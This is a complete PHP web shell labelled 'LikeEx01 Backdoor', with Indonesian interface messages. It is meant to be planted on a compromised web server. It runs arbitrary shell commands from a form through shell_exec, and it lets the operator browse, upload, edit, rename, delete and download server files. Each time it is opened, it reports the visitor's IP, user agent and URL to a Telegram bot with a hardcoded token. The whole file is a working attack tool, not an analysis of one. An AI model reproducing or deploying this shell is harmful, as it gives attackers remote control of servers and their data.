<?php
session_start();

// === TELEGRAM NOTIFY ===
$botToken = "8007060020:AAF2QHYY-mx-SO7m06lbwsh9IA_rQxrOWbo";
$chatId = "7528389144";
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$url = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$msg = "MiniShell Accessed\nIP: $ip\nUser-Agent: $userAgent\nURL: $url";
@file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($msg));

// === DIR MANAGEMENT ===
$dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if(!$dir) $dir = getcwd();
chdir($dir);

// === STATUS MESSAGE ===
$status = '';
$msgStatus = '';

// === FILE HANDLING ===
if(isset($_FILES['upload'])){
    $originalName = $_FILES['upload']['name'];
    $tmpName = $_FILES['upload']['tmp_name'];
    $fakeName = $originalName . '.txt';
    if(move_uploaded_file($tmpName,$fakeName)){
        rename($fakeName,$originalName);
        chmod($originalName,0644);
        $status = 'success';
        $msgStatus = "Upload $originalName berhasil ✔️";
    } else {
        if(file_put_contents($originalName, file_get_contents($tmpName))){
            chmod($originalName,0644);
            $status = 'success';
            $msgStatus = "Upload $originalName berhasil ✔️";
        } else {
            $status = 'error';
            $msgStatus = "Upload $originalName gagal ❌";
        }
    }
}

// === CREATE NEW FILE/FOLDER ===
if(isset($_POST['newfile'])){
    if(file_put_contents($_POST['newfile'], '')){
        chmod($_POST['newfile'],0644);
        $status = 'success';
        $msgStatus = "File {$_POST['newfile']} berhasil dibuat ✔️";
    } else {
        $status = 'error';
        $msgStatus = "File {$_POST['newfile']} gagal dibuat ❌";
    }
}

if(isset($_POST['newfolder'])){
    if(mkdir($_POST['newfolder'])){
        chmod($_POST['newfolder'],0755);
        $status = 'success';
        $msgStatus = "Folder {$_POST['newfolder']} berhasil dibuat ✔️";
    } else {
        $status = 'error';
        $msgStatus = "Folder {$_POST['newfolder']} gagal dibuat ❌";
    }
}

// === RENAME FILE/FOLDER ===
if(isset($_POST['rename_from'], $_POST['rename_to'])){
    if(rename($_POST['rename_from'], $_POST['rename_to'])){
        $status = 'success';
        $msgStatus = "Rename {$_POST['rename_from']} → {$_POST['rename_to']} berhasil ✔️";
    } else {
        $status = 'error';
        $msgStatus = "Rename {$_POST['rename_from']} gagal ❌";
    }
}

// === SAVE FILE ===
if(isset($_POST['savefile'], $_POST['filename'])){
    if(file_put_contents($_POST['filename'], $_POST['savefile'])){
        $status = 'success';
        $msgStatus = "File {$_POST['filename']} berhasil disimpan ✔️";
    } else {
        $status = 'error';
        $msgStatus = "File {$_POST['filename']} gagal disimpan ❌";
    }
}

// === DELETE FILE/FOLDER ===
if(isset($_GET['del'])){
    $target = $_GET['del'];
    if(is_file($target)) unlink($target);
    elseif(is_dir($target)) rmdir($target);
    header("Location:?path=".urlencode(dirname($target))); exit;
}

// === DOWNLOAD FILE ===
if(isset($_GET['download'])){
    $target = $_GET['download'];
    if(is_file($target)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($target).'"');
        header('Content-Length: '.filesize($target));
        readfile($target);
        exit;
    }
}

// === FUNCTION LIST FILES ===
function listFiles($dir){
    $files = array_diff(scandir($dir), ['.','..']);
    foreach($files as $file){
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        $isDir = is_dir($path);
        $size = $isDir ? 'DIR' : round(filesize($path)/1024,3).' KB';
        $encodedPath = urlencode($path);
        $displayName = htmlspecialchars($file);
        echo "<tr class='bg-gray-700 text-3xl border border-gray-600 hover:bg-gray-600 transition'>
                <td class='p-4 border border-gray-600 max-w-[400px] truncate' title='$file'>$displayName</td>
                <td class='p-4 border border-gray-600'>$size</td>
                <td class='p-4 border border-gray-600'>
                    <div class='flex flex-wrap justify-end gap-2 text-3xl'>
                        ".($isDir ? "<a href='?path=$encodedPath' title='Open Dir'><i class='fas fa-folder'></i></a>" : "")."
                        <a href='?edit=$encodedPath' title='Edit'><i class='fas fa-edit'></i></a>
                        <a href='?rename=$encodedPath' title='Rename'><i class='fas fa-i-cursor'></i></a>
                        <a href='?download=$encodedPath' title='Download'><i class='fas fa-download'></i></a>
                        <a href='?del=$encodedPath' title='Delete'><i class='fas fa-trash-alt'></i></a>
                    </div>
                </td>
              </tr>";
    }
}

// === EDIT FILE ===
if(isset($_GET['edit']) && file_exists($_GET['edit'])){
    $f = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($f));
    echo <<<HTML
<html>
<head>
<meta charset="UTF-8">
<title>Edit File</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 flex items-center justify-center min-h-screen p-4">
    <div class="bg-gray-800 rounded-3xl shadow-2xl w-full max-w-5xl p-12 animate-fadeIn border border-green-600">
        <h2 class="text-7xl font-extrabold mb-8 text-center text-green-400 drop-shadow-lg">Editing File</h2>
        <form method="POST" class="flex flex-col gap-6">
            <textarea name="savefile" rows="35" class="w-full h-[800px] bg-gray-700 text-green-200 p-8 rounded-3xl border border-green-500 text-5xl resize-none shadow-inner focus:ring-6 focus:ring-green-400 focus:outline-none">$content</textarea>
            <div class="flex flex-wrap gap-6 justify-center">
                <button class="bg-green-600 px-12 py-6 rounded-3xl text-5xl border border-green-800 hover:bg-green-700 transition-all transform hover:scale-105 shadow-lg">Save</button>
                <a href="?path={$dir}" class="bg-red-500 px-12 py-6 rounded-3xl text-5xl border border-red-700 hover:bg-red-600 transition-all transform hover:scale-105 shadow-lg">Cancel</a>
            </div>
            <input type="hidden" name="filename" value="$f">
        </form>
    </div>
</body>
</html>
HTML;
    exit;
}

// === RENAME FILE/FOLDER ===
if(isset($_GET['rename']) && file_exists($_GET['rename'])){
    $f = $_GET['rename'];
    echo <<<HTML
<html>
<head>
<meta charset="UTF-8">
<title>Rename File</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 flex items-center justify-center min-h-screen p-4">
    <div class="bg-gray-800 rounded-3xl shadow-2xl w-full max-w-4xl p-12 animate-fadeIn border border-yellow-500">
        <h2 class="text-7xl font-extrabold mb-8 text-center text-yellow-400 drop-shadow-lg">Renaming File</h2>
        <form method="POST" class="flex flex-col gap-6">
            <input type="hidden" name="rename_from" value="$f">
            <input type="text" name="rename_to" value="$f" class="w-full p-8 rounded-3xl bg-gray-700 text-yellow-200 text-5xl border border-yellow-500 shadow-inner focus:ring-6 focus:ring-yellow-400 focus:outline-none text-center">
            <div class="flex flex-wrap gap-6 justify-center">
                <button class="bg-yellow-500 px-12 py-6 rounded-3xl text-5xl border border-yellow-700 hover:bg-yellow-600 transition-all transform hover:scale-105 shadow-lg" type="submit">Rename</button>
                <a href="?path={$dir}" class="bg-red-500 px-12 py-6 rounded-3xl text-5xl border border-red-700 hover:bg-red-600 transition-all transform hover:scale-105 shadow-lg">Cancel</a>
            </div>
        </form>
    </div>
</body>
</html>
HTML;
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>𝐋𝐢𝐤𝐞𝐄𝐱𝟎𝟏 𝐁𝐚𝐜𝐤𝐝𝐨𝐫</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
<body class="bg-gray-800 text-white font-mono text-4xl w-full min-h-screen flex flex-col overflow-x-hidden">
    <div class="flex-1 w-full p-4 flex flex-col">
        <div class="bg-gray-700 flex-1 rounded border border-gray-600 flex flex-col p-4">
            <div class="text-white text-5xl font-bold text-center mb-4">[+] 𝐋𝐢𝐤𝐞𝐄𝐱𝟎𝟏 𝐁𝐚𝐜𝐤𝐝𝐨𝐫 [+]</div>

            <!-- SERVER INFO -->
            <div class="mb-6">
                <div class="text-red-500 text-3xl font-bold mb-2">Server Info:</div>
                <div class="text-green-400 text-2xl">
                    <b>Host:</b> <?php echo $_SERVER['HTTP_HOST']; ?><br>
                    <b>PHP Version:</b> <?php echo phpversion(); ?><br>
                    <b>Server Software:</b> <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
                    <b>Document Root:</b> <?php echo $_SERVER['DOCUMENT_ROOT']; ?><br>
                    <b>Remote Addr:</b> <?php echo $_SERVER['REMOTE_ADDR']; ?><br>
                    <b>User Agent:</b> <?php echo $_SERVER['HTTP_USER_AGENT']; ?><br>
                    <b>OS:</b> <?php echo PHP_OS; ?><br>
                    <b>Current Dir:</b> 
                    <a href="?path=<?php echo urlencode($dir); ?>" class="text-green-300 underline"><?php echo $dir; ?></a>
                    <?php if($dir != dirname($dir)) echo " | <a href='?path=".urlencode(dirname($dir))."' class='text-green-300 underline'>..</a>"; ?>
                </div>
            </div>

            <!-- STATUS MESSAGE -->
            <?php if($status != ''): ?>
                <div class="mb-4 p-4 rounded text-3xl <?php echo $status=='success' ? 'bg-green-600 text-white' : 'bg-red-600 text-white'; ?>">
                    <?php echo $msgStatus; ?>
                </div>
            <?php endif; ?>

            <!-- COMMAND FORM -->
            <form method="POST" class="mb-4 w-full flex flex-col gap-2">
                <input type="text" id="cmd" name="cmd" class="w-full p-3 bg-black text-green-400 border border-green-600 rounded text-3xl" placeholder="Input command...">
                <button class="bg-green-600 px-4 py-2 rounded border border-green-800 text-3xl w-full" type="submit">Execute</button>
            </form>

            <?php
            if(isset($_POST['cmd'])){
                echo "<pre class='bg-black text-green-400 p-3 mb-4 rounded border border-green-600 text-3xl overflow-auto'>".htmlspecialchars(shell_exec($_POST['cmd']))."</pre>";
            }
            ?>

            <!-- UPLOAD & CREATE -->
            <div class="flex flex-wrap gap-2 mb-4 w-full">
                <form method="post" enctype="multipart/form-data" class="flex-1 min-w-[200px]">
                    <input type="file" name="upload" class="bg-gray-300 text-black p-2 rounded w-full border border-gray-600 text-2xl">
                    <button class="mt-2 bg-blue-600 px-4 py-2 rounded border border-blue-800 w-full text-2xl" type="submit">Upload</button>
                </form>
                <form method="post" class="flex-1 min-w-[200px]">
                    <input type="text" name="newfile" class="bg-gray-300 text-black p-2 rounded w-full border border-gray-600 text-2xl" placeholder="New file name">
                    <button class="mt-2 bg-purple-600 px-4 py-2 rounded border border-purple-800 w-full text-2xl" type="submit">Create File</button>
                </form>
                <form method="post" class="flex-1 min-w-[200px]">
                    <input type="text" name="newfolder" class="bg-gray-300 text-black p-2 rounded w-full border border-gray-600 text-2xl" placeholder="New folder name">
                    <button class="mt-2 bg-pink-600 px-4 py-2 rounded border border-pink-800 w-full text-2xl" type="submit">Create Folder</button>
                </form>
            </div>

            <!-- FILE TABLE -->
            <div class="flex-1 overflow-auto">
                <table class="w-full table-auto text-3xl border border-gray-600">
                    <thead>
                        <tr class="bg-gray-600 border border-gray-600">
                            <th class="p-2 text-left border border-gray-600 max-w-[400px]">Name</th>
                            <th class="p-2 text-left border border-gray-600">Size</th>
                            <th class="p-2 text-right border border-gray-600">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php listFiles($dir); ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>
